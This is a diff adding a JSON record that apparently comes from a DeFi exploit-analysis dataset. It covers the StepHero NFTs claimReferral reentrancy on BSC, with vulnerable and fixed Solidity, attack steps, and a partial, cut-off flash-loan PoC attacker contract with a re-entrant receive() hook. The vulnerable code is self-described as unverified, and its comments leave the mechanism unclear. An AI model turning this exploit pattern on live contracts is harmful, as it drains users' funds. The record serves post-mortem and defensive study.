@@ -1,0 +1,41 @@
+{
+ "id": "2025__2025-02-22_StepHeroNFTs_ClaimReferralReentrancy",
+ "source_file": "2025/2025-02-22_StepHeroNFTs_ClaimReferralReentrancy.md",
+ "title": "StepHero NFTs — claimReferral Reentrancy Vulnerability Analysis",
+ "date": "2025-02-22",
+ "protocol": "StepHero NFTs",
+ "chain": "BSC",
+ "loss_raw": "~137.9 BNB",
+ "loss_usd": null,
+ "root_cause": "The `claimReferral()` function allowed reentrancy via the recipient contract's `receive()` hook during BNB transfers, enabling repeated invocations",
+ "attack_tx": "0xef386a69...",
+ "vulnerable_contract": "0x9823E10A...",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no reentrancy guard on claimReferral\nfunction claimReferral(address referrer) external {\n    uint256 reward = referralRewards[msg.sender];\n    if (reward > 0) {\n        referralRewards[msg.sender] = 0; // state update\n        //",
+  "❌ BNB transfer — can trigger receive() hook\n        (bool success,) = msg.sender.call{value: reward}(\"\");\n        require(success, \"Transfer failed\");\n        // What if claimReferral() is re-called from receive()?\n        // reward is already 0, so it appears reentrancy-safe...\n        // but under certain conditions reward can be replenished\n    }\n}\n\n// Attacker's receive():\nreceive() external payable {\n    if (msg.sender == stepHeroNFTs && msg.value == 3 ether) {\n        // Upon receiving BNB, immediately re-call claimReferral\n        try IStepHeroNFTs(stepHeroNFTs).claimReferral(address(0)) {\n        } catch { return; }\n    }\n}\n\n//",
+  "// Reconstructed from PoC (StepHeroNFTs_exp.sol) — NOT verified source\n\nmapping(address => uint256) public referralRewards;\n\n// ❌ claimReferral: BNB sent via call{value} before state is fully protected against reentry\nfunction claimReferral(address referrer) external {\n    uint256 reward = referralRewards[msg.sender];\n    if (reward > 0) {\n        referralRewards[msg.sender] = 0;           // state zeroed — appears safe\n        (bool success,) = msg.sender.call{value: reward}(\"\"); // ❌ BNB transfer triggers receive() on attacker contract\n        require(success, \"Transfer failed\");\n        // ❌ Under the attack flow, the referral reward is replenished between\n        //    the zero-out and the completion of the external call (via the\n        //    initial setup call with selector 0xded4de3a), so the attacker's\n        //    receive() hook can keep re-calling claimReferral and draining 3 BNB each time.\n    }\n}\n\n// Attacker contract receive() — executed each time 3 BNB arrives:\n// receive() external payable {\n//     if (msg.sender == stepHeroNFTs && msg.value == 3 ether) {\n//         IStepHeroNFTs(stepHeroNFTs).claimReferral(address(0));  // re-entrant call\n//     }\n// }"
+ ],
+ "code_after": [
+  "✅ Safe code: nonReentrant guard\nbool private _reentrancyLock;\nmodifier nonReentrant() {\n    require(!_reentrancyLock, \"Reentrant call\");\n    _reentrancyLock = true;\n    _;\n    _reentrancyLock = false;\n}\n\nfunction claimReferral(address referrer) external nonReentrant {\n    uint256 reward = referralRewards[msg.sender];\n    referralRewards[msg.sender] = 0;\n    if (reward > 0) {\n        (bool success,) = msg.sender.call{value: reward}(\"\");\n        require(success);\n    }\n}",
+  "// ✅ Fix: apply ReentrancyGuard (nonReentrant modifier) to claimReferral\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract StepHeroNFTs is ReentrancyGuard {\n    function claimReferral(address referrer) external nonReentrant {\n        uint256 reward = referralRewards[msg.sender];\n        referralRewards[msg.sender] = 0;\n        if (reward > 0) {\n            (bool success,) = msg.sender.call{value: reward}(\"\");\n            require(success, \"Transfer failed\");\n        }\n    }\n}"
+ ],
+ "steps": [
+  "→ [1] Flash loan 1,000 BNB from PancakeSwap V3",
+  "→ [2] Unwrap WBNB → BNB",
+  "→ [3] Trigger NFT operation via unknown selector (0xded4de3a)",
+  "→ [4] Call AttackerC2.buyAsset{value: 1000 BNB}(81122, 1, ...)",
+  "→ [5] Call claimReferral(address(0))",
+  "Receive 3 BNB → receive() hook executes",
+  "→ [6] Recursively call claimReferral() from within receive()",
+  "Receive 3 BNB again → receive() re-executes",
+  "→ [7] Repay flash loan (1,000 BNB + fee)",
+  "→ [8] ~137.9 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Flash loan 1,000 BNB from PancakeSwap V3\n  │\n  ├─→ [2] Unwrap WBNB → BNB\n  │\n  ├─→ [3] Trigger NFT operation via unknown selector (0xded4de3a)\n  │         └─ Sets referral reward to 3 BNB\n  │\n  ├─→ [4] Call AttackerC2.buyAsset{value: 1000 BNB}(81122, 1, ...)\n  │\n  ├─→ [5] Call claimReferral(address(0))\n  │         └─ Receive 3 BNB → receive() hook executes\n  │\n  ├─→ [6] Recursively call claimReferral() from within receive()\n  │         ├─ Receive 3 BNB again → receive() re-executes\n  │         ├─ Receive 3 BNB again → receive() re-executes\n  │         └─ ... (repeats until balance is drained)\n  │\n  ├─→ [7] Repay flash loan (1,000 BNB + fee)\n  │\n  └─→ [8] ~137.9 BNB profit",
+  "// Actual PoC code (based on DeFiHackLabs verified code)\n\ncontract AttackerC1 {\n    function attack(address to) external {\n        // [1] Flash loan 1,000 BNB\n        Uni_Pair_V3(pancakeV3Pool).flash(\n            address(this), 0, 1000 ether, abi.encode(to)\n        );\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 loanAmount = IERC20(wbnb).balanceOf(address(this));\n        WETH(wbnb).withdraw(loanAmount); // Unwrap WBNB → BNB\n\n        // [3] Trigger NFT purchase via unknown selector\n        stepHeroNFTs.call(abi.encodeWithSelector(\n            bytes4(0xded4de3a),\n            address(this), 2008, 6, 6, loanAmount,\n            bytes32(0), block.timestamp, 18766392275824\n        ));\n\n        AttackerC2 attC2 = new Attacke"
+ ]
+}
